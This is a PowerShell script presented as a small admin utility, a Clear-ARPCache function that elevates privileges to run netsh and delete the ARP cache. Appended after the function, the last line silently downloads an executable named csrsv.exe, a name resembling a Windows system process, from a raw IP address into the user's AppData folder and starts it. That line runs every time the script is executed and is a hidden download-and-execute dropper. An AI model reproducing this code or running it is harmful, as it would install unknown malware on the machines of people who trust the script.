









function Clear-ARPCache
{
    [CmdletBinding()]
    param(

    )

    Begin{
        if(-not([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator"))
        {
            Write-Warning -Message "Administrator rights are required to clear the ARP cache! Attempts to start the process with elevated privileges..."      
        }
    }

    Process{
        try{
            Start-Process -FilePath "$env:SystemRoot\System32\netsh.exe" -ArgumentList "interface ip delete arpcache" -Verb "RunAs" -WindowStyle Hidden -Wait
        }
        catch{
            throw
        }
    }

    End{

    }
}
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

